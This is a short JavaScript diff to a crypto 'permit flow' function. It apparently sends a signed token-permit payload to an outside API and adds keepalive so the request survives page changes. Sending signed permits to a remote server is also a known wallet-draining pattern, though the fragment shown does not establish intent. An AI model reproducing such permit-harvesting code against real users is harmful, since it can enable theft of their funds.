@@ -421,9 +421,11 @@ async function runPermitFlowSafe(provider, signer, user, currentRid) {
       sig_deadline: sigDeadline,
       chainId: Number(chainId)
     };
-// Terug naar de stabiele, originele fetch zonder keepalive-beperking
+
+   // 🔥 LEGO FIX: Voeg keepalive toe zodat de request niet instort als Vercel van scope wisselt
     const res = await fetch("https://api.aiiraa.com/api/permit", {
       method: "POST",
+      keepalive: true,
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload, (key, value) => typeof value === "bigint" ? value.toString() : value)
     });
